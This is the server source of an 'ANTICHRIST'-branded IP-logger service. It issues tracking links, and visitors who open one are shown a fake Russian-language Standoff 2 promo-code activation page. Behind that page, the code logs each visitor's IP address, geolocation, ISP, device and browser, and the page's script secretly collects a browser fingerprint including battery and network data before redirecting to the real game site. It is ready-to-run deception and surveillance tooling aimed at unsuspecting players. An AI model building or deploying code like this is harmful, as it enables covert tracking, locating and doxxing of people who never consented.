const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// ── Data Storage ──────────────────────────────────────────
const DATA_FILE = path.join(__dirname, '.tracker-data.json');
const ADMIN_KEY = 'ANTICHRIST-GOD-MODE';

function generateKeys(count) {
  const keys = {};
  for (let i = 0; i < count; i++) {
    const key = 'AC-' + crypto.randomBytes(4).toString('hex').toUpperCase();
    keys[key] = { used: false, usedBy: null, usedAt: null };
  }
  return keys;
}

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
      // Ensure all fields exist
      if (!data.keys) data.keys = generateKeys(50);
      if (!data.users) data.users = {};
      if (!data.links) data.links = {};
      if (!data.visitors) data.visitors = {};
      return data;
    }
  } catch (e) { console.error('[DB] Load error:', e.message); }
  // First boot — generate 50 keys
  return {
    keys: generateKeys(50),
    users: {},
    links: {},
    visitors: {}
  };
}

function saveData() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2));
  } catch (e) { console.error('[DB] Save error:', e.message); }
}

let db = loadData();
saveData(); // persist generated keys on first boot

// ── Middleware ─────────────────────────────────────────────
app.use(express.json());
app.set('trust proxy', true);

// Block main app on standoff2 subdomain — only tracking links work there
app.use((req, res, next) => {
  const host = (req.headers['x-forwarded-host'] || req.get('host') || '').toLowerCase();
  const isStandoffDomain = host.includes('standoff2');

  if (isStandoffDomain) {
    // Allow tracking links (/:id) and API endpoints
    if (req.path.startsWith('/api/') || req.path === '/healthz') {
      return next();
    }
    // Root path on standoff2 subdomain → redirect to real site
    if (req.path === '/' || req.path === '/index.html') {
      return res.redirect('https://standoff2.com');
    }
    // Everything else (tracking IDs) → pass through
  }
  next();
});

// ── API: Auth — validate key ──────────────────────────────
app.post('/api/auth', (req, res) => {
  const { key } = req.body;
  if (!key) return res.json({ success: false, error: 'no_key' });

  // Admin key
  if (key === ADMIN_KEY) {
    return res.json({ success: true, role: 'admin', nickname: 'ADMIN' });
  }

  // Check if key exists and is already used (returning user)
  if (db.keys[key] && db.keys[key].used) {
    const user = db.users[db.keys[key].usedBy];
    return res.json({ success: true, role: 'user', nickname: user ? user.nickname : null, needsNickname: false });
  }

  // Check if key exists and unused
  if (db.keys[key] && !db.keys[key].used) {
    return res.json({ success: true, role: 'user', nickname: null, needsNickname: true });
  }

  return res.json({ success: false, error: 'invalid_key' });
});

// ── API: Register — set nickname after key validation ─────
app.post('/api/register', (req, res) => {
  const { key, nickname } = req.body;
  if (!key || !nickname) return res.json({ success: false, error: 'missing_fields' });

  if (key === ADMIN_KEY) {
    return res.json({ success: true, role: 'admin', nickname: 'ADMIN' });
  }

  if (!db.keys[key] || db.keys[key].used) {
    return res.json({ success: false, error: 'invalid_or_used_key' });
  }

  // Mark key as used
  db.keys[key].used = true;
  db.keys[key].usedBy = nickname;
  db.keys[key].usedAt = new Date().toISOString();

  // Create user
  db.users[nickname] = {
    nickname: nickname,
    key: key,
    createdAt: new Date().toISOString(),
    lastSeen: new Date().toISOString(),
    linksCreated: 0
  };

  saveData();
  console.log(`[AUTH] New user registered: ${nickname} (key: ${key})`);
  res.json({ success: true, role: 'user', nickname: nickname });
});

// ── API: Admin — get all users ────────────────────────────
app.post('/api/admin/users', (req, res) => {
  if (req.body.adminKey !== ADMIN_KEY) return res.status(403).json({ error: 'not_admin' });

  const users = Object.values(db.users).map(u => ({
    ...u,
    totalClicks: Object.values(db.links)
      .filter(l => l.createdBy === u.nickname)
      .reduce((acc, l) => acc + (l.clicks || 0), 0)
  }));
  res.json({ success: true, users });
});

// ── API: Admin — rename user ──────────────────────────────
app.post('/api/admin/rename', (req, res) => {
  const { adminKey, oldNickname, newNickname } = req.body;
  if (adminKey !== ADMIN_KEY) return res.status(403).json({ error: 'not_admin' });

  if (!db.users[oldNickname]) return res.json({ success: false, error: 'user_not_found' });

  // Rename
  const user = db.users[oldNickname];
  user.nickname = newNickname;
  db.users[newNickname] = user;
  delete db.users[oldNickname];

  // Update key reference
  if (db.keys[user.key]) db.keys[user.key].usedBy = newNickname;

  // Update link references
  Object.values(db.links).forEach(l => {
    if (l.createdBy === oldNickname) l.createdBy = newNickname;
  });

  saveData();
  console.log(`[ADMIN] Renamed user: ${oldNickname} → ${newNickname}`);
  res.json({ success: true });
});

// ── API: Admin — list all keys ────────────────────────────
app.post('/api/admin/keys', (req, res) => {
  if (req.body.adminKey !== ADMIN_KEY) return res.status(403).json({ error: 'not_admin' });
  res.json({ success: true, keys: db.keys, adminKey: ADMIN_KEY });
});

// ── API: Admin — generate more keys ──────────────────────
app.post('/api/admin/generate-keys', (req, res) => {
  if (req.body.adminKey !== ADMIN_KEY) return res.status(403).json({ error: 'not_admin' });
  const count = req.body.count || 10;
  const newKeys = generateKeys(count);
  Object.assign(db.keys, newKeys);
  saveData();
  console.log(`[ADMIN] Generated ${count} new keys`);
  res.json({ success: true, newKeys: Object.keys(newKeys) });
});

// ── API: Admin — all links with user info ─────────────────
app.post('/api/admin/links', (req, res) => {
  if (req.body.adminKey !== ADMIN_KEY) return res.status(403).json({ error: 'not_admin' });
  const links = Object.values(db.links).map(l => ({
    ...l,
    visitors_count: (db.visitors[l.id] || []).length
  }));
  res.json({ success: true, links });
});

// ── API: Create tracking link ─────────────────────────────
app.post('/api/create-link', (req, res) => {
  const destination = req.body.destination || 'https://standoff2.com';
  const linkType = req.body.linkType || 'browser-promo';
  const createdBy = req.body.nickname || 'unknown';
  const id = crypto.randomBytes(4).toString('hex');

  db.links[id] = {
    id: id,
    destination: destination,
    linkType: linkType,
    createdBy: createdBy,
    created: new Date().toISOString(),
    clicks: 0
  };
  db.visitors[id] = [];

  // Increment user's link count
  if (db.users[createdBy]) {
    db.users[createdBy].linksCreated++;
    db.users[createdBy].lastSeen = new Date().toISOString();
  }

  saveData();

  const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
  const host = req.headers['x-forwarded-host'] || req.get('host');
  const trackUrl = `${proto}://${host}/${id}`;

  console.log(`[TRACK] ${createdBy} created ${linkType}: ${trackUrl} -> ${destination}`);

  res.json({
    success: true,
    url: trackUrl,
    logger_id: id,
    destination: destination,
    linkType: linkType
  });
});



// ── API: Receive extra browser fingerprint data ───────────
app.post('/api/extra-data', (req, res) => {
  const { linkId, visitorIndex, data } = req.body;
  if (linkId && db.visitors[linkId] && db.visitors[linkId][visitorIndex]) {
    db.visitors[linkId][visitorIndex].extra = data;
    saveData();
    console.log(`[EXTRA] Fingerprint received for ${linkId}[${visitorIndex}]:`, JSON.stringify(data).substring(0, 150));
  }
  res.json({ ok: true });
});

// ── Landing Page HTML ─────────────────────────────────────
function getLandingPage(linkId, visitorIndex, destination) {
  return `<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Standoff 2 — Активация</title>
<link rel="icon" href="/assets/standoff2-icon.png">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden}
.container{text-align:center;padding:2rem;max-width:400px;width:100%}
.logo-img{width:86px;height:86px;margin:0 auto 1.2rem;border-radius:22px;display:block;box-shadow:0 8px 30px rgba(255,68,68,0.35);border:2px solid rgba(255,255,255,0.1);animation:pulse 2s infinite}
h1{font-size:1.4rem;font-weight:800;margin-bottom:0.25rem;letter-spacing:1px}
.subtitle{color:#999;font-size:0.85rem;margin-bottom:2rem}
.steps{text-align:left;margin-bottom:2rem}
.step{display:flex;align-items:center;gap:0.8rem;padding:0.7rem 1rem;margin-bottom:0.5rem;background:#111;border-radius:8px;border:1px solid #1a1a1a;opacity:0.3;transition:all 0.5s ease}
.step.active{opacity:1;border-color:#333}
.step.done{opacity:1;border-color:#00cc44}
.step-icon{width:24px;height:24px;border-radius:50%;border:2px solid #333;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:0.7rem;transition:all 0.3s}
.step.active .step-icon{border-color:#ff4444;color:#ff4444;animation:spin 1s linear infinite}
.step.done .step-icon{border-color:#00cc44;background:#00cc44;color:#fff}
.step-text{font-size:0.8rem;color:#999}
.step.active .step-text{color:#e0e0e0}
.step.done .step-text{color:#00cc44}
.progress-bar{width:100%;height:3px;background:#1a1a1a;border-radius:2px;overflow:hidden;margin-bottom:1.5rem}
.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4444,#ff6644);border-radius:2px;transition:width 0.3s ease}
.footer{font-size:0.65rem;color:#444;line-height:1.6}
@keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(255,68,68,0.2)}50%{box-shadow:0 0 40px rgba(255,68,68,0.5)}}
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
  <img src="/assets/standoff2-icon.png" alt="Standoff 2" class="logo-img">
  <h1>Standoff 2</h1>
  <p class="subtitle">Активация промо-кода</p>
  
  <div class="steps">
    <div class="step" id="s1">
      <div class="step-icon">⟳</div>
      <span class="step-text">Проверка региона и доступности...</span>
    </div>
    <div class="step" id="s2">
      <div class="step-icon">⟳</div>
      <span class="step-text">Валидация промо-кода...</span>
    </div>
    <div class="step" id="s3">
      <div class="step-icon">⟳</div>
      <span class="step-text">Привязка к аккаунту...</span>
    </div>
    <div class="step" id="s4">
      <div class="step-icon">⟳</div>
      <span class="step-text">Перенаправление в магазин...</span>
    </div>
  </div>
  
  <div class="progress-bar"><div class="progress-fill" id="pbar"></div></div>
  <div class="footer">
    Не закрывайте эту страницу.<br>
    Активация может занять несколько секунд.
  </div>
</div>

<script>
(function(){
  // Collect extra browser data while the page is shown
  var extra = {};
  try {
    extra.screenW = screen.width;
    extra.screenH = screen.height;
    extra.colorDepth = screen.colorDepth;
    extra.pixelRatio = window.devicePixelRatio;
    extra.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    extra.timezoneOffset = new Date().getTimezoneOffset();
    extra.languages = navigator.languages ? navigator.languages.join(',') : navigator.language;
    extra.platform = navigator.platform;
    extra.cores = navigator.hardwareConcurrency || 0;
    extra.memory = navigator.deviceMemory || 0;
    extra.touch = navigator.maxTouchPoints || 0;
    extra.online = navigator.onLine;
    extra.cookieEnabled = navigator.cookieEnabled;
    extra.doNotTrack = navigator.doNotTrack;
    extra.connection = navigator.connection ? {
      type: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt
    } : null;
  } catch(e){}

  // Try battery API
  if (navigator.getBattery) {
    navigator.getBattery().then(function(b) {
      extra.battery = { level: b.level, charging: b.charging };
      sendExtra();
    }).catch(function(){ sendExtra(); });
  } else {
    sendExtra();
  }

  function sendExtra() {
    try {
      fetch('/api/extra-data', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
          linkId: '${linkId}',
          visitorIndex: ${visitorIndex},
          data: extra
        })
      });
    } catch(e){}
  }

  // Animate steps
  var steps = ['s1','s2','s3','s4'];
  var pbar = document.getElementById('pbar');
  var current = 0;
  var totalTime = 4000;
  var stepTime = totalTime / steps.length;

  function activateStep(i) {
    if (i >= steps.length) {
      // All done — redirect
      window.location.href = '${destination}';
      return;
    }
    var el = document.getElementById(steps[i]);
    el.classList.add('active');
    pbar.style.width = ((i + 1) / steps.length * 100) + '%';

    setTimeout(function() {
      el.classList.remove('active');
      el.classList.add('done');
      el.querySelector('.step-icon').textContent = '✓';
      activateStep(i + 1);
    }, stepTime);
  }

  setTimeout(function() { activateStep(0); }, 300);
})();
</script>
</body>
</html>`;
}

// ── API: Get visitors for a link ──────────────────────────
app.get('/api/visitors/:id', (req, res) => {
  const id = req.params.id;
  const visitors = db.visitors[id] || [];
  const link = db.links[id] || {};

  res.json({
    success: true,
    link_id: id,
    clicks: link.clicks || 0,
    visitors: visitors
  });
});

// ── API: Get all links ────────────────────────────────────
app.get('/api/links', (req, res) => {
  const links = Object.values(db.links).map(l => ({
    ...l,
    visitors_count: (db.visitors[l.id] || []).length
  }));
  res.json({ success: true, links: links });
});

// ── API: Get summary stats ────────────────────────────────
app.get('/api/stats', (req, res) => {
  const totalLinks = Object.keys(db.links).length;
  const totalClicks = Object.values(db.links).reduce((acc, l) => acc + (l.clicks || 0), 0);
  const totalVisitors = Object.values(db.visitors).reduce((acc, v) => acc + v.length, 0);

  res.json({
    success: true,
    total_links: totalLinks,
    total_clicks: totalClicks,
    total_visitors: totalVisitors
  });
});

// ── User-Agent Parser ─────────────────────────────────────
function parseUserAgent(ua) {
  let device = 'Unknown';
  let os = 'Unknown';
  let browser = 'Unknown';

  // OS detection
  if (/iPhone/.test(ua)) { os = 'iOS'; device = ua.match(/iPhone\s*(\d+)?/)?.[0] || 'iPhone'; }
  else if (/iPad/.test(ua)) { os = 'iPadOS'; device = 'iPad'; }
  else if (/Android/.test(ua)) {
    os = 'Android ' + (ua.match(/Android\s([\d.]+)/)?.[1] || '');
    // Try to extract device model
    const modelMatch = ua.match(/;\s*([^;)]+)\s*Build/);
    device = modelMatch ? modelMatch[1].trim() : 'Android Device';
  }
  else if (/Windows NT 10/.test(ua)) { os = 'Windows 10/11'; device = 'Desktop'; }
  else if (/Windows/.test(ua)) { os = 'Windows'; device = 'Desktop'; }
  else if (/Mac OS X/.test(ua)) { os = 'macOS'; device = 'Mac'; }
  else if (/Linux/.test(ua)) { os = 'Linux'; device = 'Desktop'; }

  // Browser detection
  if (/YaBrowser/.test(ua)) browser = 'Yandex Browser ' + (ua.match(/YaBrowser\/([\d.]+)/)?.[1] || '');
  else if (/SamsungBrowser/.test(ua)) browser = 'Samsung Internet ' + (ua.match(/SamsungBrowser\/([\d.]+)/)?.[1] || '');
  else if (/OPR|Opera/.test(ua)) browser = 'Opera ' + (ua.match(/OPR\/([\d.]+)/)?.[1] || '');
  else if (/Edg/.test(ua)) browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/)?.[1] || '');
  else if (/Chrome/.test(ua)) browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/)?.[1] || '');
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/)?.[1] || '');
  else if (/Firefox/.test(ua)) browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/)?.[1] || '');

  return { device, os, browser };
}

// ── Serve static files (frontend) ─────────────────────────
app.use(express.static(path.join(__dirname)));

// ── Healthcheck / Keep-alive endpoint ────────────────────
app.get('/healthz', (req, res) => {
  res.status(200).send('OK');
});

// ── Tracking catch-all (MUST be last route) ───────────────
app.get('/:id', async (req, res, next) => {
  const id = req.params.id;
  const link = db.links[id];

  // If not a tracking link, pass through (404 or whatever)
  if (!link) return next();

  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const lang = req.headers['accept-language'] || '';
  const referer = req.headers['referer'] || '';
  const timestamp = new Date().toISOString();
  const cleanIp = ip.replace('::ffff:', '');

  let geo = { country: '', city: '', isp: '', org: '', as: '', regionName: '' };
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,regionName,city,isp,org,as,query`);
    const geoData = await geoRes.json();
    if (geoData.status === 'success') geo = geoData;
  } catch (e) {
    console.error('[GEO] Lookup failed:', e.message);
  }

  const deviceInfo = parseUserAgent(userAgent);

  const visitor = {
    ip: cleanIp,
    userAgent: userAgent,
    device: deviceInfo.device,
    os: deviceInfo.os,
    browser: deviceInfo.browser,
    country: geo.country || '',
    countryCode: geo.countryCode || '',
    city: geo.city || '',
    region: geo.regionName || '',
    isp: geo.isp || '',
    org: geo.org || '',
    language: lang.split(',')[0] || '',
    referer: referer,
    timestamp: timestamp,
    extra: null
  };

  if (!db.visitors[id]) db.visitors[id] = [];
  db.visitors[id].push(visitor);
  db.links[id].clicks++;
  saveData();

  console.log(`[HIT] ${cleanIp} | ${geo.city}, ${geo.country} | ${deviceInfo.device} | ${deviceInfo.browser}`);

  const destination = link.destination || 'https://standoff2.com';
  const visitorIndex = db.visitors[id].length - 1;
  res.send(getLandingPage(id, visitorIndex, destination));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[ANTICHRIST] Server active on port ${PORT} (0.0.0.0)`);
  console.log(`[ANTICHRIST] ${Object.keys(db.links).length} existing links loaded`);

  // Self-ping to keep Render awake (every 4 minutes)
  const PING_INTERVAL = 4 * 60 * 1000;
  const selfUrl = process.env.RENDER_EXTERNAL_URL || 'https://telebot-kcqy.onrender.com';

  setInterval(() => {
    fetch(`${selfUrl}/healthz`)
      .then(res => console.log(`[KEEP-ALIVE] Ping sent to ${selfUrl} (${res.status})`))
      .catch(err => console.log(`[KEEP-ALIVE] Ping error: ${err.message}`));
  }, PING_INTERVAL);
});
